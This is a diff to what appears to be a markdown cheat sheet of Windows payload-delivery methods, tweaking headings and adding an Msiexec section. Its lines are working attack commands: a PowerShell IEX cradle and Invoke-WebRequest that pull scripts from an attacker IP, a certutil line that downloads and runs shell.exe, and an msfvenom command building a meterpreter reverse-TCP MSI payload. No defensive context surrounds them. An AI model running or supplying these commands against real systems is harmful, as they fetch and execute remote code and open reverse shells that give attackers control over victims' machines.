@@ -22,7 +22,7 @@ powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.1
 ```
 
 
-using batch file
+using batch file:
 ```bash
 attacker machine:
 
@@ -35,7 +35,13 @@ Invoke-WebRequest -Uri "http://192.168.1.120:9090/shell.bat" -OutFile "$env:TEMP
 
 ```
 
-using certutil.exe 
+using certutil.exe :
 ```bash
 certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe
+```
+
+
+Msiexec.exe:
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi > 1.msi
 ```
